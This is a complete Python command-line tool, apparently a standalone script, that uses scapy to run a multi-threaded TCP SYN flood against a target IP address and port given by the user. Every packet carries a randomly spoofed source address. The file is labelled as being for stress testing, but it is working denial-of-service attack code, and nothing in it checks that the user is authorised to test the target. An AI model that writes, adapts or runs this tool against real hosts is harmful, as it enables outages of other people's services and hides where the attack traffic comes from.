#!/usr/bin/env python3

import argparse
import random
import sys
import time
import logging
from threading import Thread
from defaults import *
from scapy.all import send, IP, TCP


def valid_port(port: int) -> int:
    if port < 1 or port > MAX_PORTS:
        raise argparse.ArgumentTypeError(
            f"Invalid port number. Must be between 1 and {MAX_PORTS}")
    return port


def valid_threads(threads: int) -> int:
    if threads < 1:
        raise argparse.ArgumentTypeError(
            "Invalid thread number. Must be greater than 0")
    return threads


def valid_ip(ip: str) -> str:
    try:
        ip = ip.split('.')
        if len(ip) != 4:
            raise argparse.ArgumentTypeError("Invalid IP address")
        for i in ip:
            if int(i) < 0 or int(i) > 255:
                raise argparse.ArgumentTypeError("Invalid IP address")
        return '.'.join(ip)
    except:
        raise argparse.ArgumentTypeError("Invalid IP address")


parser = argparse.ArgumentParser(
    description="SYN-Flooder Attack Tool for stress testing"
)
parser.add_argument('target', type=valid_ip, help="Target IP address")
parser.add_argument(
    '-a',
    '--amount',
    type=int,
    dest="packets_to_send",
    help="Amount of packets (default are infinity)",
    default=DEFAULT_PACKETS
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    '-s',
    '--seconds',
    dest="time_limit",
    type=int,
    help="Time limit for attack (default is 60 seconds)",
    default=DEFAULT_TIME_LIMIT_IN_SECONDS
)
parser.add_argument(
    '-t',
    '--threads',
    dest="threads",
    type=int,
    help="Threads (default is 1)",
    default=DEFAULT_THREADS
)
parser.add_argument(
    '-p',
    '--port',
    dest="d_port",
    type=int,
    help="Destination Port (default is 80)",
    default=DEFAULT_DESTINATION_PORT)

args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.target:
    print("Target address required!")
    parser.print_help()
    sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)


def random_ipv4_address() -> str:
    ip_address = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    return ip_address


def syn_flood_thread(target_ip: int, d_port: int, packets_to_send: int, time_limit: int):
    start_time = time.time()
    packets_sent = 0

    while packets_sent < packets_to_send and time.time() - start_time < time_limit:
        seq_n = random.randint(0, MAX_PORTS)
        s_port = random.randint(0, MAX_PORTS)
        window = random.randint(0, MAX_PORTS)
        src_ip = random_ipv4_address()
        packet = IP(dst=target_ip, src=src_ip)/TCP(sport=s_port,
                                                   dport=d_port, flags="S", seq=seq_n, window=window)
        send(packet, verbose=0)
        packets_sent += 1

        if packets_sent % 100 == 0:
            elapsed_time = time.time() - start_time
            logging.info(
                f"Thread sent {packets_sent} packets in {elapsed_time:.2f} seconds.")

    elapsed_time = time.time() - start_time
    logging.info(f"Thread finished after {elapsed_time:.2f} seconds!")


def main():
    threads = []

    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    valid_ip(args.target)
    valid_port(args.d_port)
    valid_threads(args.threads)

    try:
        for _ in range(args.threads):
            thread: Thread = Thread(
                target=syn_flood_thread,
                args=(
                    args.target,
                    args.d_port,
                    args.packets_to_send,
                    args.time_limit
                )
            )
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        logging.info("Interrupted by user. Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
